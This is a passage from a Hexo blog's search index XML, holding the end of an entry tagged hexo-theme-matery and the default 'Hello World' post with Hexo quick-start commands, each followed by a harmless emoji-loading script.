= 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> å‰ç«¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> hexo-theme-matery </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2018/09/13/hello-world/"/>
      <url>/2018/09/13/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class=" language-lang-bash"><code class="language-lang-bash">$ hexo new "My New Post"</code></pre><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class=" language-lang-bash"><code class="language-lang-bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class=" language-lang-bash"><code class="language-lang-bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class=" language-lang-bash"><code class="language-lang-bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> å‰ç«¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
